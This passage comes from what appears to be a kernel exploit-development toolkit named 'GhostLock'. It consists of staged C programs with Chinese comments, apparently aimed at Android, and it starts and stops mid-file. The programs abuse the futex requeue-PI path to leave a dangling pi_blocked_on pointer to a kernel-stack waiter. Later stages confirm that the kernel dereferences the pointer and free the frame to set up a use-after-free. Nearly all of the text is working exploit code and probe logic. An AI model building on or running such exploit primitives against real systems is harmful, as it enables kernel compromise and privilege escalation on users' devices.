	errno = 0;
	lg("W: 进入 WAIT_REQUEUE_PI(A→C)（rt_waiter 在内核栈上）");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: WAIT_REQUEUE_PI 返回 %ld errno=%d (%s)", r, errno,
	   strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;

	(void)arg;
	/* 1) O 取得 C */
	errno = 0;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld errno=%d", r, errno);
	if (r != 0) {
		lg("O: 无法取得 C，退出");
		return NULL;
	}
	S->c_held = 1;
	__sync_synchronize();

	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");

	if (noring) {
		/* 对照组：O 不尝试取 B，PI 环不成立；保持持有 C 不释放 */
		S->o_blocked = 1;
		__sync_synchronize();
		lg("O: [对照组] 不阻塞到 B（环不成立），保持持有 C");
		while (1)
			usleep(100000);
	}

	/* 2) O 尝试取 B → 阻塞（W 持有 B），入队 B，pi_blocked_on 被置位 */
	S->o_blocked = 1;
	__sync_synchronize();
	errno = 0;
	lg("O: 进入 LOCK_PI(B)（预期阻塞）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(B) 返回 %ld errno=%d (%s)（若被唤醒则说明环被打破）",
	   r, errno, strerror(errno));
	return NULL;
}

int main(int argc, char **argv)
{
	noring = (argc > 1 && strcmp(argv[1], "noring") == 0);
	pthread_t tw, to;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-1 start pid=%d mode=%s =====", getpid(), noring ? "NORING(对照)" : "RING(正常)");
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL errno=%d", errno);
		return 1;
	}
	S->A = S->B = S->C = 0;

	if (pthread_create(&tw, NULL, thread_w, NULL) ||
	    pthread_create(&to, NULL, thread_o, NULL)) {
		lg("pthread_create FAIL");
		return 1;
	}

	/* 等 W 睡在 A 上、O 阻塞在 B 上 */
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
		lg("同步完成: b_held=%d c_held=%d o_blocked=%d w_waiting=%d",
		   S->b_held, S->c_held, S->o_blocked, S->w_waiting);
		sync_log();
	}

	/* 留出让 W 真正进入内核等待的时间 */
	usleep(100000);

	lg("R: 进入 CMP_REQUEUE_PI(A→C, nr_wake=1) —— 预期 -EDEADLK");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("R: CMP_REQUEUE_PI 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && e == EDEADLK)
		lg("verdict: 命中 -EDEADLK 回滚点 → remove_waiter 已在错误上下文执行");
	else if (r >= 0)
		lg("verdict: 未命中（返回 %ld，环未形成或已被打破）", r);
	else
		lg("verdict: 其他错误 errno=%d (%s)", e, strerror(e));
	lg("立即退出，不做任何后续 PI 操作");
	sync_log();

	/* 不 join：W/O 仍在系统调用中；直接终止进程 */
	_exit(0);
}
```

`tools/g2_deref.c`:

```c
/*
 * g2_deref.c — GhostLock G-2a：验证悬垂 pi_blocked_on 是否被真正解引用
 *
 * 前序（G-1 已 4/4 命中）：CMP_REQUEUE_PI 的 -EDEADLK 回滚使
 *   remove_waiter() 在 R 的上下文执行，W->pi_blocked_on 保持指向
 *   W 内核栈上的 rt_waiter（已从 C 的等待队列摘下，锁字段仍为 C）。
 *
 * 本步判据（干净二分）：
 *   让第三个线程 X 以 500 ms 超时对 B 做 FUTEX_LOCK_PI（B 由 W 持有）
 *     - 若悬垂指针被解引用：链走查 B →(W 阻塞于)C →(O 持有)→ O 阻塞于 B → 成环
 *       → 返回 -1 / EDEADLK(35)
 *     - 若未被解引用（pi_blocked_on 已被正常清空）：X 只是正常入队等待
 *       → 返回 -1 / ETIMEDOUT(110)
 *
 * 意义：EDEADLK 即证明"用户可控栈上的 waiter 正在参与内核 PI 链计算"，
 *       这是 GhostLock 从"状态损坏"走向"可利用原语"的关键一步。
 *
 * 风险：链走查涉及的结构（C、O、B）此时均有效，预期不会崩；
 *       仍按最坏情况处理：每步 fsync、结束即 _exit、不做任何清理性 PI 操作。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>

#define LOGPATH "/data/local/tmp/g2.log"

#define FUTEX_WAIT            0
#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_UNLOCK_PI       7
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A;
	uint32_t C;
	uint32_t B;
	volatile int b_held;
	volatile int c_held;
	volatile int o_blocked;
	volatile int w_waiting;
	volatile int go_probe;
	volatile int x_done;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;

	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->b_held = 1;
	__sync_synchronize();

	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");

	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: 进入 WAIT_REQUEUE_PI(A→C)");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: WAIT_REQUEUE_PI 返回 %ld errno=%d (%s)", r, errno,
	   strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;

	(void)arg;
	/*
	 * 关键：降低 O 的调度优先级，使后面探针线程 X 在 B 上成为 top waiter。
	 * 否则 FIFO 下 O 的 waiter 占住 top 位置，task_blocks_on_rt_mutex 的
	 * 链走查分支（owner->pi_blocked_on）不会被触发，探针无意义。
	 */
	errno = 0;
	if (setpriority(PRIO_PROCESS, 0, 19) == 0)
		lg("O: setpriority(19) OK（使 X 能成为 B 的 top waiter）");
	else
		lg("O: setpriority 失败 errno=%d (%s)", errno, strerror(errno));

	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->c_held = 1;
	__sync_synchronize();

	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");

	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: 进入 LOCK_PI(B)（预期阻塞）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(B) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

/* 探针线程 X：带 500ms 超时地尝试 LOCK_PI(B) */
static void *thread_x(void *arg)
{
	struct timespec ts;
	long r;

	(void)arg;
	while (!S->go_probe)
		__asm__ __volatile__("" ::: "memory");

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_sec += 0;
	ts.tv_nsec += 500 * 1000 * 1000;
	if (ts.tv_nsec >= 1000000000L) {
		ts.tv_sec += 1;
		ts.tv_nsec -= 1000000000L;
	}

	lg("X: 进入 LOCK_PI(B)（500ms 超时）");
	errno = 0;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
	lg("X: LOCK_PI(B) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && errno == EDEADLK)
		lg("verdict: 悬垂 pi_blocked_on 已被解引用（W 的栈上 waiter 参与了 PI 链）");
	else if (r == -1 && errno == ETIMEDOUT)
		lg("verdict: 未解引用（X 正常阻塞至超时）→ 悬垂指针未被使用");
	else if (r == 0)
		lg("verdict: 意外取得 B（errno=%d）", errno);
	else
		lg("verdict: 其他 errno=%d (%s)", errno, strerror(errno));
	S->x_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tx;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-2a start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->B = S->C = 0;

	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);

	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);

	lg("R: CMP_REQUEUE_PI(A→C, 1) —— 建立损坏状态");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("R: 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	if (!(r == -1 && e == EDEADLK)) {
		lg("前置条件未达成（未进入 -EDEADLK），终止");
		sync_log();
		_exit(2);
	}
	lg("前置达成：W->pi_blocked_on 应已悬垂，W 仍阻塞于 A");
	sync_log();

	/* 启动探针线程 */
	pthread_create(&tx, NULL, thread_x, NULL);
	S->go_probe = 1;
	__sync_synchronize();

	/* 等探针完成（最多 3s） */
	{
		int spin = 0;
		while (!S->x_done && spin < 3000) {
			usleep(1000);
			spin++;
		}
		if (!S->x_done)
			lg("探针未在 3s 内返回（X 可能仍阻塞）");
	}
	usleep(200000);

	lg("结束（不做清理性 PI 操作）");
	sync_log();
	_exit(0);
}
```

`tools/g2b_deref.c`:

```c
/*
 * g2b_deref.c — GhostLock G-2b：用"能成环"的探针判定悬垂 pi_blocked_on
 *
 * 上一版（g2_deref）的缺陷：
 *   remove_waiter() 已把 W 的 waiter 从 C 的等待队列摘掉，C 变空；
 *   探针 X 即使正确解引用了 W->pi_blocked_on（lock=C），走到 C 后也无 waiter
 *   可判死锁，链走查直接终止 → 表现为 ETIMEDOUT，无法区分"解引用"与"未解引用"。
 *
 * 本版探针（Y: LOCK_PI(C)，500ms 超时）：
 *   Y 在 C 上入队成功后，若 owner(O)->pi_blocked_on 有效、且 W->pi_blocked_on 悬垂，
 *   链走查路径为：
 *       C(orig_lock, owner=O) → O 阻塞于 B → B(owner=W) → W 的 pi_blocked_on → C
 *   回到 orig_lock → 命中 rtmutex.c:644 → 返回 -EDEADLK。
 *
 *   判据：
 *     EDEADLK(35)   → 悬垂指针被解引用（关键结论）
 *     ETIMEDOUT(110)→ 链未回到 C，说明 W->pi_blocked_on 已被清空
 *
 *   对照：无任何损坏时，Y 只是普通阻塞（C 由 O 持有，O 阻塞于 B，W 阻塞于普通
 *   futex，PI 链不成环）→ 必然 ETIMEDOUT。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/resource.h>

#define LOGPATH "/data/local/tmp/g2b.log"

#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A, C, B;
	volatile int b_held, c_held, o_blocked, w_waiting;
	volatile int go_probe, y_done;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->b_held = 1;
	__sync_synchronize();
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: 进入 WAIT_REQUEUE_PI(A→C)");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: WAIT_REQUEUE_PI 返回 %ld errno=%d (%s)", r, errno,
	   strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	setpriority(PRIO_PROCESS, 0, 19);
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld errno=%d", r, errno);
	if (r != 0)
		return NULL;
	S->c_held = 1;
	__sync_synchronize();
	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: 进入 LOCK_PI(B)（预期阻塞）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(B) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

/* 探针：对 C 做 LOCK_PI，带 500ms 超时 */
static void *thread_y(void *arg)
{
	struct timespec ts;
	long r;
	(void)arg;
	while (!S->go_probe)
		__asm__ __volatile__("" ::: "memory");

	clock_gettime(CLOCK_MONOTONIC, &ts);
	ts.tv_nsec += 500L * 1000 * 1000;
	if (ts.tv_nsec >= 1000000000L) {
		ts.tv_sec += 1;
		ts.tv_nsec -= 1000000000L;
	}
	lg("Y: 进入 LOCK_PI(C)（500ms 超时）");
	errno = 0;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, &ts, NULL, 0);
	lg("Y: LOCK_PI(C) 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && errno == EDEADLK)
		lg("verdict: 悬垂 pi_blocked_on 被解引用（PI 链经 W 的栈上 waiter 成环）");
	else if (r == -1 && errno == ETIMEDOUT)
		lg("verdict: 未成环 → W->pi_blocked_on 应为 NULL（悬垂已被清除）");
	else if (r == 0)
		lg("verdict: 意外取得 C");
	else
		lg("verdict: 其他 errno=%d (%s)", errno, strerror(errno));
	S->y_done = 1;
	__sync_synchronize();
	return NULL;
}

int main(void)
{
	pthread_t tw, to, ty;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-2b start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->B = S->C = 0;

	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);

	lg("R: CMP_REQUEUE_PI(A→C, 1)");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("R: 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	if (!(r == -1 && e == EDEADLK)) {
		lg("前置未达成，终止");
		sync_log();
		_exit(2);
	}
	lg("前置达成：W 仍阻塞于 A，其 pi_blocked_on 应悬垂指向 C 的旧 waiter");
	sync_log();

	pthread_create(&ty, NULL, thread_y, NULL);
	S->go_probe = 1;
	__sync_synchronize();

	{
		int spin = 0;
		while (!S->y_done && spin < 3000) {
			usleep(1000);
			spin++;
		}
		if (!S->y_done)
			lg("探针未在 3s 内返回");
	}
	lg("结束（不做清理性 PI 操作）");
	sync_log();
	_exit(0);
}
```

`tools/g2c_deref.c`:

```c
/*
 * g2c_deref.c — GhostLock G-2c：用"第二次 requeue_pi"判定悬垂 pi_blocked_on
 *
 * 为什么前两版探针无效：
 *   rt_mutex_adjust_prio_chain() 在 waiter->prio == task->prio 且
 *   detect_deadlock == false 时提前 goto out_unlock_pi（rtmutex.c:596-604）。
 *   而 FUTEX_LOCK_PI 走的是 RT_MUTEX_MIN_CHAINWALK → detect_deadlock = false
 *   → 结构上到不了死锁判定点。只有 rt_mutex_start_proxy_lock()（requeue_pi）
 *   使用 RT_MUTEX_FULL_CHAINWALK，才会真正做死锁检测。
 *
 * 本探针：
 *   [阶段1] 用 G-1 的三锁环触发 -EDEADLK，使 W->pi_blocked_on 悬垂指向
 *           "lock 字段为 C" 的旧 waiter（W 仍阻塞在普通 futex A 上）。
 *   [阶段2] 新线程 W2 在普通 futex A2 上 WAIT_REQUEUE_PI(A2 → **C**)，
 *           主线程对 A2→C 做 CMP_REQUEUE_PI。
 *           start_proxy_lock(C, waiter2, W2)：
 *             try_to_take 失败（C 的 owner 是 O）
 *             task_blocks_on_rt_mutex(FULL_CHAINWALK) → 链走查从 C 出发：
 *               C(owner=O) → O 阻塞于 B → B(owner=W) → W->pi_blocked_on(悬垂)
 *               → lock = C → **C == orig_lock** → -EDEADLK
 *
 * 判据：
 *   -EDEADLK(35)  → 悬垂指针被真实解引用（关键结论）
 *   1 / 0         → W->pi_blocked_on 为空，链走查正常结束（悬垂不存在）
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g2c.log"

#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A;  /* 阶段1：W 的等待点 */
	uint32_t A2; /* 阶段2：W2 的等待点 */
	uint32_t B;  /* W 持有 */
	uint32_t C;  /* O 持有 */
	volatile int b_held, c_held, o_blocked, w_waiting;
	volatile int w2_waiting;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("W: LOCK_PI(B) → %ld", r);
	if (r != 0)
		return NULL;
	S->b_held = 1;
	__sync_synchronize();
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: WAIT_REQUEUE_PI(A→C)（rt_waiter 在 W 栈上）");
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: LOCK_PI(C) → %ld", r);
	if (r != 0)
		return NULL;
	S->c_held = 1;
	__sync_synchronize();
	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked = 1;
	__sync_synchronize();
	lg("O: LOCK_PI(B)（预期阻塞，形成环）");
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	lg("O: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

static void *thread_w2(void *arg)
{
	long r;
	(void)arg;
	/* 在 A2 上等待被 requeue 到 C —— 复用同一把 C */
	S->w2_waiting = 1;
	__sync_synchronize();
	lg("W2: WAIT_REQUEUE_PI(A2→C)");
	r = futex(&S->A2, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	lg("W2: 返回 %ld errno=%d (%s)", r, errno, strerror(errno));
	return NULL;
}

int main(void)
{
	pthread_t tw, to, tw2;
	long r;
	int e;

	logfd = open(LOGPATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
	lg("===== G-2c start pid=%d =====", getpid());
	sync_log();

	S = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
		 MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	if (S == MAP_FAILED) {
		lg("mmap FAIL");
		return 1;
	}
	S->A = S->A2 = S->B = S->C = 0;

	/* ---------- 阶段 1：触发 -EDEADLK ---------- */
	pthread_create(&tw, NULL, thread_w, NULL);
	pthread_create(&to, NULL, thread_o, NULL);
	{
		int spin = 0;
		while ((!S->w_waiting || !S->o_blocked) && spin < 3000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(100000);

	lg("[1] CMP_REQUEUE_PI(A→C, 1)");
	sync_log();
	errno = 0;
	r = futex(&S->A, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[1] 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();
	if (!(r == -1 && e == EDEADLK)) {
		lg("阶段1 未命中，终止");
		sync_log();
		_exit(2);
	}
	lg("[1] 达成：W 仍阻塞于 A，W->pi_blocked_on 应悬垂（lock 字段 = C）");
	sync_log();

	/* ---------- 阶段 2：第二次 requeue_pi，目标同为 C ---------- */
	pthread_create(&tw2, NULL, thread_w2, NULL);
	{
		int spin = 0;
		while (!S->w2_waiting && spin < 1000) {
			usleep(1000);
			spin++;
		}
	}
	usleep(150000);

	lg("[2] CMP_REQUEUE_PI(A2→C, 1) —— 若悬垂指针有效，则 C == orig_lock 命中死锁");
	sync_log();
	errno = 0;
	r = futex(&S->A2, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 1, NULL,
		  &S->C, 0);
	e = errno;
	lg("[2] 返回 %ld errno=%d (%s)", r, e, strerror(e));
	sync_log();

	lg("---- 判定 ----");
	if (r == -1 && e == EDEADLK)
		lg("verdict: 悬垂 pi_blocked_on 被真实解引用（链走查经 W 回到 orig_lock=C）");
	else if (r >= 0)
		lg("verdict: 链走查正常结束（返回 %ld）→ W->pi_blocked_on 应为空", r);
	else
		lg("verdict: 其他 errno=%d (%s)", e, strerror(e));
	sync_log();
	lg("结束");
	sync_log();
	_exit(0);
}
```

`tools/g3_free.c`:

```c
/*
 * g3_free.c — GhostLock G-3a：让栈帧死亡而悬垂指针留存（真正的 UAF 起点）
 *
 * 关键依据（futex.c:2794-2809）：
 *   handle_early_requeue_pi_wakeup() 在 `!match_futex(&q->key, key2)` 时
 *   （即 requeue 失败、q->key 仍指向 A）会 plist_del 并把 ret 置为
 *   -EWOULDBLOCK / -ERESTARTNOINTR，调用者随即 goto out_put_keys 返回，
 *   **不经过 rt_mutex_finish_proxy_lock()，因此也不会调用 remove_waiter()**。
 *
 *   ⇒ 对 A 做一次普通 FUTEX_WAKE，W 返回用户态、内核栈帧弹出，
 *     而 W->pi_blocked_on 仍指向那个已失效的 rt_mutex_waiter。
 *
 * 步骤：
 *   [1] 三锁环触发 -EDEADLK（G-1/G-2c 已验证，稳定命中）
 *   [2] FUTEX_WAKE(A, 1) → W 应带着 -EWOULDBLOCK 返回（栈帧死亡）
 *   [3] oracle：再次 CMP_REQUEUE_PI(A2→C)
 *         -EDEADLK → 指针仍在（已指向失效栈帧 = 真 UAF）
 *         >=0      → 指针已被清除
 *
 * 风险：栈帧已弹出，oracle 的链走查会解引用可能已被复用的栈内存。
 *       按最坏情况处理：每步 fsync、结束即 _exit。
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/syscall.h>
#include <sys/mman.h>

#define LOGPATH "/data/local/tmp/g3.log"

#define FUTEX_WAKE            1
#define FUTEX_LOCK_PI         6
#define FUTEX_WAIT_REQUEUE_PI 11
#define FUTEX_CMP_REQUEUE_PI  12
#define FUTEX_PRIVATE_FLAG    128

static int logfd = -1;

static double now_ms(void)
{
	struct timespec ts;
	clock_gettime(CLOCK_MONOTONIC, &ts);
	return ts.tv_sec * 1000.0 + ts.tv_nsec / 1e6;
}

static void lg(const char *fmt, ...)
{
	char buf[300], line[360];
	va_list ap;
	int n;

	va_start(ap, fmt);
	vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	n = snprintf(line, sizeof(line), "[%8.1fms] %s\n", now_ms(), buf);
	if (write(1, line, n) < 0) { }
	if (logfd >= 0 && write(logfd, line, n) < 0) { }
}

static void sync_log(void)
{
	if (logfd >= 0)
		fsync(logfd);
}

static long futex(uint32_t *uaddr, int op, uint32_t val, void *timeout,
		  uint32_t *uaddr2, uint32_t val3)
{
	return syscall(SYS_futex, uaddr, op, val, timeout, uaddr2, val3);
}

struct shared {
	uint32_t A, A2, B, C;
	volatile int b_held, c_held, o_blocked, w_waiting, w_returned;
	volatile int w2_waiting;
	volatile int w_go_next;
	volatile long w_ret;
	volatile int w_errno;
};

static struct shared *S;

static void *thread_w(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->B, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	if (r != 0) {
		lg("W: LOCK_PI(B) 失败 errno=%d", errno);
		return NULL;
	}
	S->b_held = 1;
	__sync_synchronize();
	while (!S->o_blocked)
		__asm__ __volatile__("" ::: "memory");
	S->w_waiting = 1;
	__sync_synchronize();
	lg("W: WAIT_REQUEUE_PI(A→C)");
	errno = 0;
	r = futex(&S->A, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE_FLAG, 0, NULL,
		  &S->C, 0);
	S->w_ret = r;
	S->w_errno = errno;
	S->w_returned = 1;
	__sync_synchronize();
	lg("W: 返回 %ld errno=%d (%s) ← 栈帧此刻起失效",
	   r, S->w_errno, strerror(S->w_errno));

	/* 纯用户态自旋：不发任何 syscall，避免立即复用内核栈覆盖掉那个 waiter */
	while (!S->w_go_next)
		__asm__ __volatile__("" ::: "memory");
	return NULL;
}

static void *thread_o(void *arg)
{
	long r;
	(void)arg;
	r = futex(&S->C, FUTEX_LOCK_PI | FUTEX_PRIVATE_FLAG, 0, NULL, NULL, 0);
	if (r != 0) {
		lg("O: LOCK_PI(C) 失败 errno=%d", errno);
		return NULL;
	}
	S->c_held = 1;
	__sync_synchronize();
	while (!S->b_held)
		__asm__ __volatile__("" ::: "memory");
	S->o_blocked = 1;
	__sync_synchronize();
